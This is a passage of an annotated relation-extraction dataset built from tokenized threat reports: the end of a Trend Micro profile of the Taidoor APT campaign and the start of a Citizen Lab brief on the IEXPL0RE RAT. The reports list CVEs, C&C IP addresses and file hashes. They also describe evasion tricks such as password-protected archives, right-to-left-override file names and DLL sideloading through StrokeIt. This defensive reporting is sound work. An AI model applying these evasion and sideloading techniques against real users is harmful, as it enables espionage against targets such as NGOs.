")", "."], ["If", "this", "happens", "on", "a", "critical", "server", ",", "this", "can", "cause", "loss", "of", "business", "revenue", "or", "critical", "data", "."], ["Sufficiently", "motivated", "threat", "actors", "can", "penetrate", "even", "networks", "that", "use", "moderately", "advanced", "security", "measures", "."], ["As", "such", ",", "apart", "from", "standard", "and", "relevant", "attack", "prevention", "measures", "and", "mechanisms", "such", "as", "solid", "patch", "management", ";", "endpoint", "and", "network", "security", ";", "firewall", "use", ";", "and", "the", "like", ",", "enterprises", "should", "also", "focus", "on", "detecting", "and", "mitigating", "attacks", "."], ["Moreover", ",", "data", "loss", "prevention", "(", "DLP", ")", "strategies", "such", "as", "identifying", "exactly", "what", "an", "organization", "is", "protecting", "and", "taking", "into", "account", "the", "context", "of", "data", "use", "should", "be", "employed", "."], ["L", "ocal", "and", "E", "xter", "nal", "T", "hr", "eat", "Intelligence"], ["Threat", "intelligence", "refers", "to", "indicators", "that", "can", "be", "used", "to", "identify", "the", "tools", ",", "tactics", ",", "and", "procedures", "threat", "actors", "engaging", "in", "targeted", "attacks", "utilize", "."], ["Both", "external", "and", "local", "threat", "intelligence", "is", "crucial", "for", "developing", "the", "ability", "to", "detect", "attacks", "early", "."], ["The", "following", "are", "the", "core", "components", "of", "this", "defense", "strategy", ":", "\u2022", "\u2022", "\u2022", "10", "|", "T", "h"], ["e", "T", "a", "i", "d", "o", "o", "r", "C", "a", "m", "p", "a", "i", "g", "n", "Enhanced", "visibility", ":", "Logs", "from", "endpoint", ",", "server", ",", "and", "network", "monitoring", "are", "an", "important", "and", "often", "underused", "resource", "that", "can", "be", "aggregated", "to", "provide", "a", "view", "of", "the", "activities", "within", "an", "organization", "that", "can", "be", "processed", "for", "anomalous", "behaviors", "that", "can", "indicate", "a", "targeted", "attack", "."], ["Integrity", "checks", ":"], ["In", "order", "to", "maintain", "persistence", ",", "malware", "will", "make", "modifications", "to", "the", "file", "system", "and", "registry", "."], ["Monitoring", "such", "changes", "can", "indicate", "the", "presence", "of", "malware", "."], ["Empowering", "the", "human", "analyst", ":", "Humans", "are", "best", "positioned", "to", "identify", "anomalous", "behaviors", "when", "presented", "with", "a", "view", "of", "aggregated", "logs", "from", "across", "a", "network", "."], ["This", "information", "is", "used", "in", "conjunction", "with", "custom", "alerts", "based", "on", "the", "local", "and", "external", "threat", "intelligence", "available", "."], ["Technologies", "available", "today", "such", "as", "Trend", "Micro", "\u2122"], ["Deep", "Discovery", "provide", "visibility", ",", "insight", ",", "and", "control", "over", "networks", "to", "defend", "against", "targeted", "threats", "."], ["12", "Deep", "Discovery", "uniquely", "detects", "and", "identifies", "evasive", "threats", "in", "real", "time", "and", "provides", "in", "-", "depth", "analysis", "and", "actionable", "intelligence", "to", "prevent", ",", "discover", ",", "and", "reduce", "risks", "."], ["Mitigation", "and", "Cleanup", "S", "tr", "ategy"], ["Once", "an", "attack", "is", "identified", ",", "the", "cleanup", "strategy", "should", "focus", "on", "the", "following", "objectives", ":", "\u2022", "\u2022", "\u2022", "Determine", "the", "attack", "vector", "and", "cut", "off", "communications", "with", "the", "C&C", "server", "."], ["Determine", "the", "scope", "of", "the", "compromise", "."], ["Assess", "the", "damage", "by", "analyzing", "the", "data", "and", "forensic", "artifacts", "available", "on", "compromised", "machines", "."], ["Remediation", "should", "be", "applied", "soon", "afterward", ",", "which", "includes", "steps", "to", "fortify", "affected", "servers", ",", "machines", ",", "or", "devices", "into", "secure", "states", ",", "informed", "in", "part", "by", "how", "the", "compromised", "machines", "were", "infiltrated", "."], ["12", "http://www.trendmicro.com/us/enterprise/security-riskmanagement/deep-discovery/index.html", "11", "|"], ["T", "h"], ["e", "T", "a", "i", "d", "o", "o", "r", "C", "a", "m", "p", "a", "i", "g", "n", "E", "ducating", "E", "mployees", "Against", "S", "ocial"], ["E", "ngineering", "Security", "-", "related", "policies", "and", "procedures", "combined", "with", "education", "and", "training", "programs", "are", "essential", "components", "of", "defense", "."], ["Traditional", "training", "methods", "can", "be", "fortified", "by", "simulations", "and", "exercises", "using", "real", "spear", "-", "phishing", "attempts", "sent", "to", "test", "employees", "."], ["Employees", "trained", "to", "expect", "targeted", "attacks", "are", "better", "positioned", "to", "report", "potential", "threats", "and", "constitute", "an", "important", "source", "of", "threat", "intelligence", "."], ["Data", "-", "Centr", "ic", "P", "r", "otection", "S", "tr", "ategy"], ["The", "ultimate", "objective", "of", "targeted", "attacks", "is", "to", "acquire", "sensitive", "data", "."], ["As", "such", ",", "DLP", "strategies", "that", "focus", "on", "identifying", "and", "protecting", "confidential", "information", "are", "critical", "."], ["Enhanced", "data", "protection", "and", "visibility", "across", "an", "enterprise", "provides", "the", "ability", "to", "control", "access", "to", "sensitive", "data", "as", "well", "as", "monitor", "and", "log", "successful", "and", "unsuccessful", "attempts", "to", "access", "it", "."], ["Enhanced", "access", "control", "and", "logging", "capabilities", "allow", "security", "analysts", "to", "locate", "and", "investigate", "anomalies", ",", "respond", "to", "incidents", ",", "and", "initiate", "remediation", "strategies", "and", "damage", "assessment", "."], ["TREND", "MICRO", "THREAT", "PROTECTION", "AGAINST", "TAIDOOR"], ["CAMPAIGN", "COMPONENTS", "Table", "3", "summarizes", "the", "Trend", "Micro", "solutions", "for", "the", "components", "of", "the", "Taidoor", "campaign", "."], ["Trend", "Micro", "recommends", "a", "comprehensive", "security", "risk", "management", "strategy", "that", "goes", "further", "than", "advanced", "protection", "to", "meet", "the", "real", "-", "time", "threat", "management", "requirements", "of", "dealing", "with", "targeted", "attacks", "."], ["Attack", "Component", "Protection", "Technology", "Trend", "Micro", "Solution", "Initial", "C&C", "server", "request", "format", ":", "Web", "Reputation", "Endpoint", "(", "Titanium", ",", "Worry", "-", "Free"], ["[", "C&C]/{5", "random"], ["characters}.php?id={6", "random", "numbers}{encrypted", "victim", "\u2019s", "MAC", "address", "}", "Business", "Security", ",", "OfficeScan", ")"], ["Server", "(", "Deep", "Security", ")", "Messaging", "(", "InterScan", "Messaging", "Security", ",", "ScanMail", "Suite", "for", "Microsoft", "Exchange", ")"], ["Network", "(", "Deep", "Discovery", ")"], ["Gateway", "(", "InterScan", "Web", "Security", ",", "InterScan", "Messaging", "Security", ")"], ["Mobile", "(", "Mobile", "Security", ")", "BKDR_SIMBO.DUKKS", "File", "Reputation", "BKDR_SIMBOT.SMC", "(", "Antivirus", "/", "Anti", "-", "malware", ")"], ["BKDR_SIMBOT.SME"], ["HEUR_OLEXP.A"], ["TROJ_ARTIEF.VTG"], ["TROJ_DLOADE.SMJ"], ["Endpoint", "(", "Titanium", ",", "Worry", "-", "Free", "Business", "Security", ",", "OfficeScan", ")"], ["Server", "(", "Deep", "Security", ")", "Messaging", "(", "InterScan", "Messaging", "Security", ",", "ScanMail", "Suite", "for", "Microsoft", "Exchange", ")"], ["Network", "(", "Deep", "Discovery", ")"], ["Gateway", "(", "InterScan", "Web", "Security", ",", "TROJ_DLOADR.TDG", "InterScan", "Messaging", "Security", ")", "TROJ_DLOADR.WKJ", "Mobile", "(", "Mobile", "Security", ")"], ["TROJ_GEN.R21C3E6", "TROJ_GEN.R3EC1J7", "TROJ_GEN.R3EC2G4", "TROJ_GEN.R3EC7JC", "12", "|", "T", "h"], ["e", "T", "a", "i", "d", "o", "o", "r", "C", "a", "m", "p", "a", "i", "g", "n", "Attack", "Component", "Protection", "Technology", "Trend", "Micro", "Solution", "Vulnerability", "Shielding", "/", "Virtual"], ["Patching", "Server", "(", "Deep", "Security", ")", "TROJ_GEN.R42C3JR", "TROJ_GEN.R47E1K9"], ["TROJ_GEN.R49C7KI", "TROJ_GEN.R4FCRBC", "TROJ_INJECT.ZZXX"], ["TROJ_MSDROP.ZZXX", "CVE-2009", "-", "3129"], ["CVE-2009", "-", "4324"], ["CVE-2010", "-", "1297"], ["CVE-2010", "-", "2883", "Endpoint", "(", "OfficeScan", "with", "Intrusion", "Defense", "Firewall", "Plug", "-", "In", ")"], ["For", "CVE-2009", "-", "3129", ":"], ["\u2022", "CVE-2011", "-", "0611", "Rule", "#", "1003817", "(", "Excel", "Featheader", "Record", "Memory", "Corruption", "Vulnerability", ")", "CVE-2011", "-", "1269", "For", "CVE-2009", "-", "4324", ":", "CVE-2012", "-", "0158", "\u2022", "Rule", "#", "1004008"], ["(", "Adobe", "Reader", "and", "Acrobat", "'", "newplayer", "(", ")", "'", "JavaScript", "Method", "Code", "Execution", ")", "For", "CVE-2010", "-", "1297", ":", "\u2022", "Rule", "#", "1004202"], ["(", "Adobe", "Products", "authplay.dll", "Remote", "Code", "Execution", "Vulnerability", ")", "For", "CVE-2010", "-", "2883", ":", "\u2022", "Rule", "#", "1004393", "(", "Adobe", "Reader", "SING", "Table", "Parsing", "Vulnerability", ")", "\u2022", "Rule", "#", "1004113", "(", "Identified"], ["Malicious", "Adobe", "PDF", "Document", ")", "\u2022", "Rule", "#", "1004315", "(", "Identified", "Malicious", "Adobe", "PDF", "Document", ")"], ["For", "CVE-2011", "-", "0611", ":"], ["\u2022", "13", "|", "T", "h"], ["e", "T", "a", "i", "d", "o", "o", "r", "C", "a", "m", "p", "a", "i", "g", "n", "Rule", "#", "1004647", "(", "Restrict", "Microsoft", "Office", "File", "with", "Embedded", "SWF", ")", "Attack", "Component", "Protection", "Technology", "Trend", "Micro", "Solution"], ["For", "CVE-2011", "-", "1269"], [":", "\u2022", "Rule", "#", "1004661", "(", "Microsoft", "PowerPoint", "Remote", "Code", "Execution", "Vulnerability", ")"], ["For", "CVE-2012", "-", "0158", ":", "58.40.20.165", "Web", ",", "Domain", ",", "and", "IP", "Reputation", "60.248.216.194"], ["60.249.219.82"], ["60.250.39.73"], ["61.222.190.100", "61.222.205.180", "\u2022", "Rule", "#", "1004973"], ["(", "MSCOMCTL.OCX", "RCE", "Vulnerability", "for", "Rich", "Text", "File", ")", "\u2022", "Rule"], ["#", "1004977", "(", "Restrict", "Microsoft", "Windows", "Common"], ["ListView", "and", "TreeView", "ActiveX"], ["Controls", ")", "\u2022", "Rule#1004978"], ["(", "MSCOMCTL.OCX", "RCE", "Vulnerability", "for", "Office", "Binary"], ["File", ")", "Endpoint", "(", "Titanium", ",", "Worry", "-", "Free", "Business", "Security", ",", "OfficeScan", ")"], ["Server", "(", "Deep", "Security", ")", "Messaging", "(", "InterScan", "Messaging", "Security", ",", "ScanMail", "Suite", "for", "Microsoft", "Exchange", ")"], ["Network", "(", "Deep", "Discovery", ")"], ["Gateway", "(", "InterScan", "Web", "Security", ",", "61.218.233.51", "InterScan", "Messaging", "Security", ")", "62.13.61.173", "Mobile", "(", "Mobile", "Security", ")"], ["63.135.55.13"], ["64.34.60.218", "69.178.171.135", "85.43.157.110", "112.217.74.188"], ["201.159.226.189", "202.40.188.10", "202.251.249.222", "14", "|", "T", "h"], ["e", "T", "a", "i", "d", "o", "o", "r", "C", "a", "m", "p", "a", "i", "g", "n", "Attack", "Component", "Protection", "Technology"], ["203.90.100.21", "203.114.103.58", "203.116.147.94", "203.146.189.141", "203.146.189.160"], ["203.150.231.236", "210.65.11.11", "211.35.222.6", "211.22.72.193", "213.50.91.196"], ["216.139.109.156"], ["222.101.218.86", "15", "|", "T", "h"], ["e", "T", "a", "i", "d", "o", "o", "r", "C", "a", "m", "p", "a", "i", "g", "n", "Trend", "Micro", "Solution", "August", "2012", "|", "APT", "Campaign", "Quick", "Profile", ":", "Taidoor"], ["Advanced", "persistent", "threats", "(", "APTs", ")", "refer", "to", "a", "category", "of", "threats", "that", "aggressively", "pursue", "and", "compromise", "specific", "targets", "to", "maintain", "persistent", "presence", "within", "the", "victim", "\u2019s", "network", "so", "they", "can", "move", "laterally", "and", "exfiltrate", "data", "."], ["Unlike", "indiscriminate", "cybercrime", "attacks", ",", "spam", ",", "web", "threats", ",", "and", "the", "like", ",", "APTs", "are", "much", "harder", "to", "detect", "because", "of", "the", "targeted", "nature", "of", "related", "components", "and", "techniques", "."], ["Also", ",", "while", "cybercrime", "focuses", "on", "stealing", "credit", "card", "and", "banking", "information", "to", "gain", "profit", ",", "APTs", "are", "better", "thought", "of", "as", "cyber", "espionage", "."], ["TAIDOOR"], ["\u2022", "First", "Seen", "Individual", "targeted", "attacks", "are", "not", "one", "-", "off", "attempts", "."], ["Attackers", "continually", "try", "to", "get", "inside", "the", "target", "\u2019s", "network", "."], ["Based", "on", "Trend", "Micro", "\u2122", "Smart", "Protection", "Network", "\u2122", "data", ",", "the", "earliest", "Taidoor", "campaign", "-", "related", "activities", "were", "seen", "as", "far", "back", "as", "October", "2010", "."], ["\u2022", "Victims", "and", "Targets"], ["APT", "campaigns", "target", "specific", "industries", "or", "communities", "of", "interest", "in", "specific", "regions", "."], ["This", "campaign", "primarily", "targeted", "government", "organizations", "located", "in", "Taiwan", "."], ["\u2022", "Operations"], ["The", "first", "-", "stage", "computer", "intrusions", "often", "use", "social", "engineering", "."], ["Attackers", "custom", "-", "fit", "attacks", "to", "their", "targets", "."], ["In", "this", "campaign", ",", "attackers", "sent", "an", "email", "to", "targets", "."], ["The", "email", "came", "with", "specially", "created", "file", "attachments", "that", "exploited", "vulnerabilities", "such", "as", "CVE-2012", "-", "0158", ",", "CVE-2009", "-", "4324", ",", "CVE-2010", "-", "1297", ",", "CVE-2010", "-", "2883", ",", "CVE-2011", "-", "0611", ",", "CVE-2011", "-", "1269", ",", "and", "CVE-2009", "-", "3129", "."], ["The", "purpose", "of", "the", "file", "attachment", "is", "to", "drop", "and", "install", "SIMBOT", "malware", "variants", ",", "which", "had", "functionalities", "normally", "seen", "in", "Remote", "Access", "Trojans", "(", "RATs", ")", "."], ["\u2022", "Possible", "Indicators", "of", "Compromise", "Attackers", "want", "to", "remain", "undetected", "as", "long", "as", "possible", "."], ["A", "key", "characteristic", "of", "these", "attacks", "is", "stealth", "."], ["The", "GET", "and", "POST", "requests", "from", "compromised", "computers", "contained", "a", "URL", "path", "in", "the", "following", "format", ",", "aaaaa.php?id=bbbbbbcccccccccccc", ",", "where", "\u201c", "aaaaa", "\u201d", "refers", "to", "five", "random", "characters", "that", "form", "a", "file", "name", ",", "\u201c", "bbbbbb", ",", "\u201d", "refers", "to", "six", "pseudorandomly", "generated", "characters", "that", "change", "for", "each", "connection", ",", "and", "\u201c", "cccccccccccc", "\u201d", "refers", "to", "12", "characters", "that", "represent", "the", "compromised", "host", "\u2019s", "MAC", "address", "that", "is", "obfuscated", "using", "a", "custom", "algorithm", "."], ["In", "addition", ",", "the", "initial", "command", "-", "and", "-", "control", "(", "C&C", ")", "server", "request", "typically", "uses", "the", "following", "format", ":"], ["[", "C&C]/{5", "random", "characters}.php?id={6", "random", "numbers}{encrypted", "victim", "\u2019s", "MAC", "address", "}"], ["*"], ["The", "full", "technical", "details", "of", "this", "attack", "can", "be", "read", "in", "the", "Trend", "Micro", "research", "paper", ",", "\u201c", "The", "Taidoor", "Campaign", ":"], ["An", "In", "-", "Depth", "Analysis", ".", "\u201d"], ["The", "characteristics", "highlighted", "in", "this", "APT", "campaign", "profile", "reflect", "the", "results", "of", "our", "investigation", "as", "of", "August", "2012", "."], ["TR", "E", "ND", "MICR", "O", "\u2122", "TR", "E", "ND", "MICR", "O"], ["INC", ".", "Trend", "Micro", "Incorporated", "(", "TYO", ":", "4704", ";", "TSE", ":", "4704", ")", ",", "a", "global", "cloud", "security", "leader", ",", "creates", "a", "world", "safe", "for", "exchanging", "digital", "information", "with", "its", "Internet", "content", "security", "and", "threat", "management", "solutions", "for", "businesses", "and", "consumers", "."], ["A", "pioneer", "in", "server", "security", "with", "over", "20", "years", "\u2019", "experience", ",", "we", "deliver", "top", "-", "ranked", "client", ",", "server", "and", "cloud", "-", "based", "security", "that", "fits", "our", "customers", "\u2019", "and", "partners", "\u2019", "needs", ",", "stops", "new", "threats", "faster", ",", "and", "protects", "data", "in", "physical", ",", "virtualized", "and", "cloud", "environments", "."], ["Powered", "by", "the", "industry", "-", "leading", "Trend", "Micro", "\u2122", "Smart", "Protection", "Network", "\u2122", "cloud", "computing", "security", "infrastructure", ",", "our", "products", "and", "services", "stop", "threats", "where", "they", "emerge", "\u2014", "from", "the", "Internet", "."], ["They", "are", "supported", "by", "1,000", "+", "threat", "intelligence", "experts", "around", "the", "globe", "."], ["10101", "N.", "De", "Anza", "Blvd", "."], ["Cupertino", ",", "CA", "95014"], ["U.S.", "toll", "free", ":", "1", "+800.228.5651", "Phone", ":", "1", "+408.257.1500"], ["Fax", ":", "1", "+408.257.2003", "www.trendmicro.com", "\u00a9", "20", "12", "by", "Trend", "Micro", ",", "Incorporated", "."], ["All", "rights", "reserved", "."], ["Trend", "Micro", "and", "the", "T", "rend", "Micro", "t", "-", "ball", "logo", "are", "trademarks", "or", "registered", "trademarks", "of", "Trend", "Micro", ",", "Incorporated", "."], ["All", "other", "product", "or", "company", "names", "may", "be", "trademarks", "or", "registered", "trademarks", "of", "their", "owners", "."]]}, {"vertexSet": [[{"name": "IEXPL0RE RAT", "pos": [5, 7], "sent_id": 2, "type": "TrojanHorse"}], [{"name": "2011", "pos": [36, 37], "sent_id": 3, "type": "Time"}], [{"name": "2010", "pos": [42, 43], "sent_id": 3, "type": "Time"}], [{"name": "IEXPL0RE RAT", "pos": [7, 9], "sent_id": 4, "type": "TrojanHorse"}], [{"name": "Sharky RAT", "pos": [5, 7], "sent_id": 5, "type": "TrojanHorse"}], [{"name": "c0d0so0", "pos": [9, 10], "sent_id": 6, "type": "TrojanHorse"}], [{"name": "Backdoor.Briba", "pos": [12, 15], "sent_id": 6, "type": "TrojanHorse"}], [{"name": "IEXPL0RE RAT", "pos": [6, 8], "sent_id": 18, "type": "TrojanHorse"}], [{"name": "StrokeIt", "pos": [0, 1], "sent_id": 39, "type": "Software"}], [{"name": "IEXPL0RE.EXE", "pos": [1, 2], "sent_id": 49, "type": "TrojanHorse"}], [{"name": "perf*.dat", "pos": [2, 3], "sent_id": 51, "type": "Malware"}], [{"name": "ContainerV2", "pos": [5, 6], "sent_id": 52, "type": "Malware"}], [{"name": "client", "pos": [11, 12], "sent_id": 53, "type": "Malware"}], [{"name": "csv.exe", "pos": [52, 53], "sent_id": 57, "type": "TrojanHorse"}], [{"name": "360tray.exe", "pos": [1, 2], "sent_id": 58, "type": "Malware"}], [{"name": "svchost.exe", "pos": [1, 2], "sent_id": 59, "type": "Malware"}], [{"name": "ContainerV2", "pos": [1, 2], "sent_id": 60, "type": "Malware"}], [{"name": "client", "pos": [8, 9], "sent_id": 60, "type": "Malware"}], [{"name": "IEXPL0RE", "pos": [14, 15], "sent_id": 72, "type": "TrojanHorse"}], [{"name": "d7c826ac94522416a0aecf5b7a5d2afe", "pos": [6, 7], "sent_id": 73, "type": "MD5"}], [{"name": "66e1aff355c29c6f39b21aedbbed2d5c", "pos": [3, 4], "sent_id": 74, "type": "MD5"}], [{"name": "21a1ee58e4b543d7f2fa3b4022506029", "pos": [3, 4], "sent_id": 75, "type": "MD5"}], [{"name": "8d4e42982060d884e2b7bd257727fd7c", "pos": [3, 4], "sent_id": 76, "type": "MD5"}], [{"name": "CONTAINERV2", "pos": [7, 8], "sent_id": 76, "type": "Malware"}], [{"name": "d46d85777062afbcda02de68c063b877", "pos": [14, 15], "sent_id": 76, "type": "MD5"}], [{"name": "85e8c6ddcfa7e289be14324abbb7378d", "pos": [18, 19], "sent_id": 76, "type": "MD5"}], [{"name": "CLIENT", "pos": [21, 22], "sent_id": 76, "type": "Malware"}], [{"name": "November 1, 2011", "pos": [10, 14], "sent_id": 77, "type": "Time"}], [{"name": "eb51b384fcbbe468a6877f569021c5d1", "pos": [15, 16], "sent_id": 77, "type": "MD5"}], [{"name": "November 29, 2011", "pos": [16, 20], "sent_id": 77, "type": "Time"}], [{"name": "8268297c1b38832c03f1c671e0a54a78", "pos": [21, 22], "sent_id": 77, "type": "MD5"}], [{"name": "IEXPL0RE", "pos": [11, 12], "sent_id": 78, "type": "TrojanHorse"}], [{"name": "C:\\Documents and Settings\\user\\Local Settings\\Temp\\31A.tmp", "pos": [54, 58], "sent_id": 78, "type": "File"}], [{"name": "C:\\Documents and Settings\\user\\Local Settings\\Temp\\perf6cd2e5e9.dat", "pos": [58, 62], "sent_id": 78, "type": "File"}], [{"name": "C:\\WINDOWS\\system\\lock.dat", "pos": [0, 1], "sent_id": 80, "type": "File"}], [{"name": "C:\\WINDOWS\\system\\MSMAPI32.SRG", "pos": [1, 2], "sent_id": 80, "type": "File"}], [{"name": "C:\\WINDOWS\\system32\\STREAM.SYS", "pos": [2, 3], "sent_id": 80, "type": "File"}], [{"name": "IEXPL0RE", "pos": [6, 7], "sent_id": 80, "type": "TrojanHorse"}], [{"name": "IEXPL0RE", "pos": [3, 4], "sent_id": 85, "type": "TrojanHorse"}], [{"name": "China", "pos": [18, 19], "sent_id": 87, "type": "Country"}], [{"name": "0xCD", "pos": [17, 18], "sent_id": 95, "type": "Obfuscation"}], [{"name": "update.microsoft.com", "pos": [8, 9], "sent_id": 109, "type": "Indicator"}], [{"name": "ContainerV2", "pos": [3, 4], "sent_id": 110, "type": "Malware"}], [{"name": "IEXPL0RE RAT", "pos": [5, 7], "sent_id": 136, "type": "TrojanHorse"}], [{"name": "network intrusion detection system", "pos": [1, 5], "sent_id": 139, "type": "CourseOfAction"}]], "labels": [{"r": "P33", "h": 3, "t": 1, "evidence": [3, 4]}, {"r": "P33", "h": 3, "t": 2, "evidence": [3, 4]}, {"r": "P21", "h": 22, "t": 18, "evidence": [72, 76]}, {"r": "P21", "h": 21, "t": 18, "evidence": [72, 75]}, {"r": "P21", "h": 20, "t": 18, "evidence": [72, 74]}, {"r": "P21", "h": 19, "t": 18, "evidence": [72, 73]}, {"r": "P21", "h": 24, "t": 23, "evidence": [76]}, {"r": "P21", "h": 25, "t": 23, "evidence": [76]}, {"r": "P21", "h": 28, "t": 26, "evidence": [76, 77]}, {"r": "P21", "h": 30, "t": 26, "evidence": [76, 77]}, {"r": "P33", "h": 26, "t": 27, "evidence": [76, 77]}, {"r": "P33", "h": 26, "t": 29, "evidence": [76, 77]}, {"r": "P21", "h": 32, "t": 31, "evidence": [78]}, {"r": "P21", "h": 33, "t": 31, "evidence": [78]}, {"r": "P21", "h": 34, "t": 37, "evidence": [80]}, {"r": "P21", "h": 35, "t": 37, "evidence": [80]}, {"r": "P21", "h": 36, "t": 37, "evidence": [80]}, {"r": "P32", "h": 38, "t": 39, "evidence": [85, 87]}, {"r": "P21", "h": 41, "t": 42, "evidence": [109, 110]}, {"r": "P34", "h": 44, "t": 43, "evidence": [136, 139]}], "title": "201209CitizenLabIEXPL0RERAT", "sents": [["CITIZEN", "LAB", "TECHNICAL", "BRIEF", "001", "IEXPL0RE", "RAT"], ["BY", "SETH", "HARDY", "|", "AUGUST", "2012"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "1", "INTRODUCTION"], ["This", "report", "describes", "a", "remote", "access", "trojan", "(", "RAT", ")", "that", "three", "human", "rights", "-", "related", "organizations", "taking", "part", "in", "a", "Citizen", "Lab", "study", "on", "targeted", "cyber", "threats", "against", "human", "rights", "groups", "received", "via", "email", "in", "2011", "and", "at", "the", "end", "of", "2010", "."], ["Here", "we", "refer", "to", "it", "as", "the", "IEXPL0RE", "RAT", ",", "after", "the", "name", "of", "the", "launcher", "program", "."], ["It", "was", "first", "called", "\u201c", "Sharky", "RAT", "\u201d", "in", "Seth", "Hardy", "\u2019s", "talk", "at", "SecTor", "2011", "."], ["Since", "then", "it", "has", "also", "been", "referred", "to", "as", "c0d0so0", "and", "possibly", "Backdoor", ".", "Briba", "."], ["A", "RAT", "is", "a", "program", "that", "allows", "a", "remote", "user", "full", "access", "to", "a", "computer", "."], ["This", "type", "of", "program", "can", "be", "used", "for", "legitimate", "reasons", "."], ["In", "these", "cases", ",", "RAT", "can", "also", "stand", "for", "remote", "administration", "tool", "."], ["In", "the", "case", "of", "the", "IEXPL0RE", "RAT", ",", "the", "remote", "user", "has", "the", "ability", "to", "record", "user", "keystrokes"], ["(", "including", "passwords", ")", ",", "copy", "and", "delete", "files", ",", "download", "and", "run", "new", "programs", ",", "and", "even", "use", "the", "computer", "\u2019s", "microphone", "and", "camera", "to", "listen", "to", "and", "watch", "the", "user", "in", "real", "-", "time", "."], ["RATs", "are", "common", "in", "targeted", "malware", "attacks", "against", "human", "rights", "organizations", "and", "other", "NGOs", "."], ["Targeted", "attacks", "with", "this", "sort", "of", "payload", "are", "often", "referred", "to", "as", "advanced", "persistent", "threats", "(", "APTs", ")", "."], ["APTs", "differ", "from", "other", "traditional", "computer", "attacks", "in", "that", "they", "are", "designed", "to", "be", "quiet", "and", "collect", "data", "over", "time", ",", "and", "act", "as", "a", "starting", "point", "for", "future", "tracking", "and", "compromise", "of", "targets", "."], ["It", "is", "not", "uncommon", "for", "an", "APT", "infection", "to", "persist", "for", "months", "or", "even", "years", "after", "the", "malicious", "program", "is", "first", "run", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "2", "ATTACK", "VECTOR"], ["Attempted", "delivery", "of", "the", "malware", "was", "via", "email", "attachment", ",", "employing", "social", "engineering", "techniques", "."], ["The", "emails", "that", "contained", "the", "attached", "IEXPL0RE", "RAT", "were", "different", "every", "time", ",", "with", "a", "unique", "email", "and", "delivery", "method", "used", "for", "each", "attempt", ",", "including", "multiple", "versions", "targeted", "at", "the", "same", "organization", "."], ["Each", "email", "was", "tailored", "specifically", "for", "the", "target", ",", "both", "in", "terms", "of", "subject", ",", "content", ",", "and", "the", "way", "the", "RAT", "was", "attached", "and", "hidden", "."], ["Organization", "1", ":", "a", "human", "rights", "NGO", "received", "multiple", "emails", "with", "interesting", "keywords", "from", "senders", "claiming", "to", "be", "from", "personal", "friends", "."], ["These", "emails", "included", "an", "executable", "attachment", "in", "a", "password", "-", "protected", "archive", ",", "which", "helps", "prevent", "detection", "by", "antivirus", "software", "."], ["The", "password", "was", "included", "in", "the", "email", "address", "."], ["Organization", "2", ":", "a", "news", "organization", "operating", "a", "website", "that", "reports", "on", "developments", "in", "China", ",", "received", "an", "email", "containing", "a", "story", "about", "a", "high", "-", "rise", "apartment", "building", "fire", "."], ["Attached", "to", "the", "email", "were", "four", "images", "and", "two", "executable", "files", "(", ".scr", "extensions", ")", "designed", "to", "look", "like", "images", "using", "the", "Unicode", "right", "-", "to", "-", "left", "override", "character", "."], ["When", "each", "executable", "file", "is", "run", ",", "it", "will", "install", "and", "launch", "the", "malware", ",", "drop", "an", "image", ",", "open", "the", "image", ",", "and", "delete", "itself", "."], ["The", "end", "result", "is", "that", "only", "an", "image", "is", "left", ",", "making", "the", "email", "look", "more", "legitimate", "if", "the", "malware", "is", "run", "(", "figure", "1", ")", "."], ["FIGURE", "1", ":", "IMAGE", "OF", "A", "HIGH", "-", "RISE", "FIRE", "USED", "TO", "TRICK", "RECIPIENTS", "INTO", "RUNNING", "THE", "MALWARE", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "3", "Organization", "3", ":", "a", "Tibet", "-", "related", "organization", "received", "two", "emails", "with", "different", "versions", "of", "the", "malware", "attached", "."], ["The", "first", "file", "was", "an", "executable", "file", "designed", "to", "appear", "as", "a", "video", "of", "a", "speech", "by", "the", "Dalai", "Lama", ",", "attached", "to", "an", "email", "about", "a", "year", "review", "of", "Tibetan", "human", "rights", "issues", "(", "figure", "2", ")", "."], ["The", "second", "file", "was", "embedded", "in", "an", "Excel", "spreadsheet", "attached", "to", "an", "email", "pretending", "to", "be", "from", "a", "conference", "on", "climate", "change", "."], ["Emails", "that", "contain", "malicious", "attachments", "use", "a", "variety", "of", "social", "engineering", "techniques", "to", "appear", "more", "legitimate", "."], ["Methods", "include", "using", "names", "of", "real", "people", "and", "organizations", ",", "choosing", "material", "that", "is", "directly", "related", "to", "the", "target", "\u2019s", "interests", ",", "and", "including", "chains", "of", "fake", "forwards", "to", "make", "it", "appear", "as", "if", "the", "email", "has", "been", "circulated", "."], ["Including", "the", "attachments", "in", "a", "RAR", "file", "makes", "them", "less", "likely", "to", "be", "discovered", "by", "an", "antivirus", "(", "AV", ")", "scanner", "."], ["Putting", "a", "password", "on", "the", "archive", "and", "including", "it", "in", "the", "email", "reduces", "the", "chances", "of", "AV", "discovery", "even", "further", "."], ["FIGURE", "2", ":", "EXAMPLE", "TARGETED", "EMAIL"], ["WITH", "IEXPL0RE", "RAT", "USING", "SOCIAL", "ENGINEERING", "METHODS", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "4", "A", "newer", "version", "of", "the", "RAT", "payload", "was", "later", "distributed", "via", "email", "in", "multiple", "RTF", "documents", "to", "organization", "3", "."], ["The", "RTF", "dropped", "a", "DLL", "alongside", "a", "legitimate", "program", "vulnerable", "to", "DLL", "injection", ",", "allowing", "the", "program", "to", "run", "without", "a", "warning", "that", "the", "program", "is", "not", "digitally", "signed", "."], ["StrokeIt", ",", "a", "program", "for", "using", "mouse", "gestures", ",", "uses", "a", "file", "named", "config.dll", "without", "verifying", "the", "authenticity", "of", "the", "file", "."], ["By", "replacing", "config.dll", "with", "the", "RAT", "downloader", ",", "the", "malicious", "code", "is", "run", "while", "appearing", "more", "legitimate", "to", "the", "operating", "system", "(", "figure", "3", ")", "."], ["FIGURE", "3", ":", "VALID", "DIGITAL", "SIGNATURE", "FOR", "THE", "STROKEIT", "PROGRAM", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF", ":", "IEXPL0RE", "RAT", "5", "MALWARE"], ["The", "IEXPL0RE", "RAT", "is", "delivered", "inside", "an", "executable", "program", "or", "document", ",", "which", "is", "customgenerated", "for", "each", "email", "."], ["When", "a", "user", "opens", "the", "document", "or", "runs", "the", "program", ",", 